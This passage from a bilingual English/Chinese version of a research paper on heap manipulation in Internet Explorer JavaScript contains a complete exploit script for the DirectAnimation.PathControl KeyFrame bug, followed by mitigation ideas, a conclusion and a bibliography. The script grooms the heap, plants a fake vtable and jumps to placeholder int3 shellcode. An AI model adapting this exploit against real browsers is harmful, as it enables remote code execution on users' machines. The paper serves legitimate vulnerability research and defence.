lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>shellcode</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>了。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
full exploit code is shown below:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>完整的利用代码如下：</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'><span style='mso-spacerun:yes'>    </span>// Create the ActiveX object<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>var target = new ActiveXObject(&quot;DirectAnimation.PathControl&quot;);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Initialize the heap library<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>var heap = new heapLib.ie();<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// int3 shellcode<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>var shellcode = unescape(&quot;%uCCCC&quot;);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// address of jmp ecx instruction in IEXPLORE.EXE<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>var jmpecx = 0x4058b5;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Build a fake vtable with pointers to the shellcode<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>var vtable = heap.vtable(shellcode, jmpecx);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Get the address of the lookaside that will point to the vtable<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>var fakeObjPtr = heap.lookasideAddr(vtable);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Build the heap block with the fake object address<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>//<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// len<span style='mso-spacerun:yes'>      </span>padding<span style='mso-spacerun:yes'>         </span>fake obj pointer<span style='mso-spacerun:yes'>  </span>padding<span style='mso-spacerun:yes'>   </span>null<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// 4 bytes<span style='mso-spacerun:yes'>  </span>0x<st1:chmetcnv
UnitName="C" SourceValue="200" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">200C</st1:chmetcnv>-4 bytes<span style='mso-spacerun:yes'>  </span>4 bytes<span style='mso-spacerun:yes'>           </span>14 bytes<span style='mso-spacerun:yes'>  </span>2 bytes<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>var fakeObjChunk = heap.padding((0x<st1:chmetcnv
UnitName="C" SourceValue="200" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">200c</st1:chmetcnv>-4)/2) + heap.addr(fakeObjPtr) + heap.padding(14/2);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.gc();<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.debugHeap(true);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Empty the lookaside<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.debug(&quot;Emptying the lookaside&quot;)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>for (var i = 0; i &lt; 100; i++)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>heap.alloc(vtable)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Put the vtable on the lookaise<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.debug(&quot;Putting the vtable on the lookaside&quot;)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.lookaside(vtable);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Defragment the heap<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.debug(&quot;Defragmenting the heap with blocks of size 0x2010&quot;)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>for (var i = 0; i &lt; 100; i++)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>heap.alloc(0x2010)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Add the block with the fake object pointer to the free list<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.debug(&quot;Creating two holes of size 0x2020&quot;);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.freeList(fakeObjChunk, 2);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Trigger the exploit<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>target.KeyFrame(0x40000801, new Array(1), new Array(1));<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Cleanup<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>heap.debugHeap(false);<o:p></o:p></span></pre>

<h2><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'>Remediation<o:p></o:p></span></h2>

<h2><span style='font-size:12.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>补救措施</span><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'><o:p></o:p></span></h2>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>This
section of the paper will briefly introduce some ideas for protecting browsers
against the exploitation techniques described above.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>这一节中我们将简单介绍一下保护浏览器防止执行</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>exploit</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的技术。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Heap
isolation<o:p></o:p></span></h3>

<h3><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>建立专门的堆</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
most obvious, but not completely effective, method for protecting the browser
heap is to use a dedicated heap for storing JavaScript strings. This requires a
very simple change in the OLEAUT32 memory allocator and will render the string
allocation technique completely ineffective. The attacker will still be able to
manipulate the layout of the string heap, but will have no direct control over
the heap used by MSHTML and ActiveX object.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>这是很显然的，但也不是完全有效，我们应该建立一个专门的堆来存放</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>JavaScript</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>string</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>对象。要做到这一点，只要对</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>OLEAUT32</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中的内存分配函数作一点点很小的改进就可以使通过</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象注入</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>shellcode</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的方法完全失效。当然，这样做攻击者还是能完全能控制</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象所在那个堆中的内存的分配，但是这样攻击者就不能控制</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>MSHTML</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>和</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>ActiveX</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>对象公用的那个堆了。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>If
this protection mechanism is implemented in a future Windows release, we expect
exploitation research to focus on methods for controlling the ActiveX or MSHTML
heaps through specific ActiveX method calls or DHTML manipulations.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>如果在</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>Windows</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的下一个版本的操作系统中实现了这个保护机制，我想漏洞利用的研究者们就只能被迫去研究如果通过一些特殊的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>ActiveX</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>方法调用或者</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>DHTML</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>操作来控制</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>ActiveX</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>或者</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>MSHTML</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>公用的那个堆了。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>In
terms of security architecture, the heap layout should be treated as a first
class exploitable object, similar to the stack or heap data. As a general
design principle, untrusted code should not be given direct access to the heap
used by other components of the application.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>从计算机安全的角度出发考虑问题，如果黑客能控制堆中内存分配，他就能利用漏洞进行攻击。这个问题应该被当作与栈溢出、堆腐烂一样具有广泛威胁的可被利用的漏洞。所以于一般的设计原则中，应该保证未受信任的代码不应该可以直接使用应用程序中提供的组件访问堆。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>Non-determinism<o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Introducing
non-determinism into the memory allocator is a good way to make heap
exploitation more unreliable. If the attacker is not able to predict where a
particular heap allocation will go, it will become much harder to set up the
heap in a desired state. This is not a new idea, but to our knowledge it has
not been implemented in any major operating system.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>所谓的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>non-determinism</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>就是随机分配堆中的数据，让攻击者不能准确的预测出某次内存分配将会把哪块内存分配出来，这样攻击者就很难把堆调整到某种他需要的状态。这样就能有效的降低堆溢出漏洞的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>exploit</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的有效性。但遗憾的是，到目前为止，我还不知道在这方面有什么新的进展，至少在任何一种主流的操作系统中都没有实现这一想法。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<h2><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'>Conclusion<o:p></o:p></span></h2>

<h2><span style='font-size:12.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>结论</span><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'><o:p></o:p></span></h2>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
heap manipulation technique presented in this paper relies on the fact that the
JavaScript implementation in Internet Explorer gives untrusted code executing
in the browser the ability to perform arbitrary allocations and frees on the
system heap. This degree of control over the heap has been demonstrated to
significantly increase the reliability and precision of even the hardest heap
corruption exploits.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>本文中描述的有关的堆操作技术是基于</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>IE</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>JavaScript</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>实现中错误的授予未被信任代码在浏览器中执行的，并在系统堆中任意分配和删除内存块的问题的。我们演示的对堆中内存块的精确的操控技巧显著的增加了之前很难利用的堆腐烂漏洞的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>exploit</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的可靠性和精确度。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Two
possible avenues for further research are Windows Vista exploitation and
applying the same techniques to Firefox, Opera and Safari. We believe that the
general idea of manipulating the heap from a scripting language is also
applicable to many other systems that allow untrusted script execution.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>有兴趣的读者可以进一步研究在</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>Windows Vista</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中的利用方式，以及类似的漏洞在</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>Firefox, Opera</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>以及</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>Safari</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中的利用方式。我们相信，由于大多数浏览器中都允许未经信任的脚本在浏览器中执行，这样通过脚本语言来操作堆的状态进而开发漏洞</span><a
name="OLE_LINK2"></a><a name="OLE_LINK1"><span style='mso-bookmark:OLE_LINK2'><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>exploit</span></span></a><span
style='mso-bookmark:OLE_LINK2'></span><span style='mso-bookmark:OLE_LINK1'></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的方法会有很广阔的应用前景。</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<div>

<h2><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'>Bibliography<o:p></o:p></span></h2>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Heap
Internals<o:p></o:p></span></h3>

<ul type=disc>
 <li class=MsoNormal style='color:#404040;mso-margin-top-alt:auto;mso-margin-bottom-alt:
     auto;mso-list:l15 level1 lfo14;tab-stops:list 36.0pt'><span lang=EN-US
     style='font-size:9.5pt;font-family:Verdana'><a
     href="http://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Marinescu.pdf">Windows
     Vista Heap Management Enhancements</a> by Adrian Marinescu<o:p></o:p></span></li>
</ul>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Heap
Exploitation<o:p></o:p></span></h3>

<ul type=disc>
 <li class=MsoNormal style='color:#404040;mso-margin-top-alt:auto;mso-margin-bottom-alt:
     auto;mso-list:l8 level1 lfo15;tab-stops:list 36.0pt'><span lang=EN-US
     style='font-size:9.5pt;font-family:Verdana'><a
     href="http://www.blackhat.com/presentations/win-usa-02/halvarflake-winsec02.ppt">Third
     Generation Exploitation</a> by Halvar Flake <o:p></o:p></span></li>
 <li class=MsoNormal style='color:#404040;mso-margin-top-alt:auto;mso-margin-bottom-alt:
     auto;mso-list:l8 level1 lfo15;tab-stops:list 36.0pt'><span lang=EN-US
     style='font-size:9.5pt;font-family:Verdana'><a
     href="http://www.blackhat.com/presentations/win-usa-04/bh-win-04-litchfield/bh-win-04-litchfield.ppt">Windows
     Heap Overflows</a> by David Litchfield <o:p></o:p></span></li>
 <li class=MsoNormal style='color:#404040;mso-margin-top-alt:auto;mso-margin-bottom-alt:
     auto;mso-list:l8 level1 lfo15;tab-stops:list 36.0pt'><span lang=EN-US
     style='font-size:9.5pt;font-family:Verdana'><a
     href="http://www.cybertech.net/~sh0ksh0k/projects/winheap/XPSP2%20Heap%20Exploitation.ppt">XP
     SP2 Heap Exploitation</a> by Matt Conover <o:p></o:p></span></li>
 <li class=MsoNormal style='color:#404040;mso-margin-top-alt:auto;mso-margin-bottom-alt:
     auto;mso-list:l8 level1 lfo15;tab-stops:list 36.0pt'><span lang=EN-US
     style='font-size:9.5pt;font-family:Verdana'><a
     href="http://packetstormsecurity.nl/papers/bypass/bypassing-win-heap-protections.pdf">Bypassing
     Windows heap protections</a> by Nicolas Falliere <o:p></o:p></span></li>
 <li class=MsoNormal style='color:#404040;mso-margin-top-alt:auto;mso-margin-bottom-alt:
     auto;mso-list:l8 level1 lfo15;tab-stops:list 36.0pt'><span lang=EN-US
     style='font-size:9.5pt;font-family:Verdana'><a
     href="http://www.maxpatrol.com/defeating-xpsp2-heap-protection.pdf">Defeating
     Microsoft Windows XP SP2 Heap Protection and DEP bypass</a> by Alexander
     Anisimov <o:p></o:p></span></li>
 <li class=MsoNormal style='color:#404040;mso-margin-top-alt:auto;mso-margin-bottom-alt:
     auto;mso-list:l8 level1 lfo15;tab-stops:list 36.0pt'><span lang=EN-US
     style='font-size:9.5pt;font-family:Verdana'><a
     href="http://www.security-assessment.com/Whitepapers/Exploiting_Freelist%5b0%5d_On_XPSP2.zip">Exploiting
     Freelist[0] on XP SP2</a> by Brett Moore <o:p></o:p></span></li>
</ul>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>JavaScript
Internals<o:p></o:p></span></h3>

<ul type=disc>
 <li class=MsoNormal style='color:#404040;mso-margin-top-alt:auto;mso-margin-bottom-alt:
     auto;mso-list:l9 level1 lfo16;tab-stops:list 36.0pt'><span lang=EN-US
     style='font-size:9.5pt;font-family:Verdana'><a
     href="http://blogs.msdn.com/ericlippert/archive/2003/09/17/53038.aspx">How
     Do The Script Garbage Collectors Work?</a> by Eric Lippert <o:p></o:p></span></li>
</ul>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Internet
Explorer Exploitation<o:p></o:p></span></h3>

<ul type=disc>
 <li class=MsoNormal style='color:#404040;mso-margin-top-alt:auto;mso-margin-bottom-alt:
     auto;mso-list:l5 level1 lfo17;tab-stops:list 36.0pt'><span lang=EN-US
     style='font-size:9.5pt;font-family:Verdana'><a
     href="http://www.edup.tudelft.nl/~bjwever/advisory_iframe.html.php">Internet
     Explorer IFRAMG exploit</a> by SkyLined <o:p></o:p></span></li>
 <li class=MsoNormal style='color:#404040;mso-margin-top-alt:auto;mso-margin-bottom-alt:
     auto;mso-list:l5 level1 lfo17;tab-stops:list 36.0pt'><span lang=EN-US
     style='font-size:9.5pt;font-family:Verdana'><a
     href="http://metasploit.com/projects/Framework/exploits.html#ie_webview_setslice">ie_webview_setslice
     exploit</a> by H D Moore <o:p></o:p></span></li>
</ul>

</div>

</div>

</body>

</html>
